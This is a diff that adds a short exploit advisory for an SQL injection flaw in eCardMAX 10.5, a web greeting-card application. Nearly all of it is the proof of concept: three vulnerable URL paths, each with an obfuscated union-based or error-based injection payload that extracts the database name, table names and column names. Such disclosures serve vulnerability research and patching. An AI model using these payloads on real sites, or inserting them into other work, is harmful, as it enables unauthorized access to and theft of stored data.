@@ -1,0 +1,32 @@
+# # # # #
+# Exploit Title: eCardMAX 10.5 - SQL Injection
+# Dork: N/A
+# Date: 18.08.2017
+# Vendor Homepage : https://www.ecardmax.com/
+# Software Link: https://www.ecardmax.com/home/ecardmax/
+# Demo: https://ecardmax.com/ecardmaxdemo/
+# Version: 10.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 	
+# Proof of Concept:
+# 
+# view-source:http://localhost/[PATH]/cards/sendcard/[SQL]
+# 727+union+select+(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),0x64656465--+-/0x496873616e53656e63616e
+# 
+# http://localhost/[PATH]/category/[SQL]
+# 11'+aND(/*!22223SELECT*/+0x30783331+/*!22223FROM*/+(/*!22223SELECT*/+cOUNT(*),/*!22223CONCAT*/((/*!22223sELECT*/(/*!22223sELECT*/+/*!22223CONCAT*/(cAST(dATABASE()+aS+/*!22223cHAR*/),0x7e,0x496873616E53656e63616e))+/*!22223fROM*/+iNFORMATION_sCHEMA.tABLES+/*!22223wHERE*/+tABLE_sCHEMA=dATABASE()+lIMIT+0,1),fLOOR(/*!22223rAND*/(0)*2))x+/*!22223fROM*/+iNFORMATION_sCHEMA.tABLES+gROUP+bY+x)a)+/*!22223aNd*/+''='/0x496873616e53656e63616e
+# 
+# http://localhost/[PATH]/invitation/[SQL]
+# 15'+aND(/*!00002SelEcT*/+0x30783331+/*!00002frOM*/+(/*!00002SelEcT*/+cOUNT(*),/*!00002cOnCaT*/((/*!00002sELECT*/(/*!00002sELECT*/+/*!00002cOnCaT*/(cAST(dATABASE()+aS+/*!00002cHAR*/),0x7e,0x496873616E53656e63616e))+/*!00002FRoM*/+iNFORMATION_sCHEMA.tABLES+/*!00002wHERE*/+tABLE_sCHEMA=dATABASE()+lIMIT+0,1),fLOOR(/*!00002rAND*/(0)*2))x+/*!00002FRoM*/+iNFORMATION_sCHEMA.tABLES+gROUP+bY+x)a)+/*!00002aNd*/+''='/0x496873616e53656e63616e
+# 
+# Etc...
+# # # # #
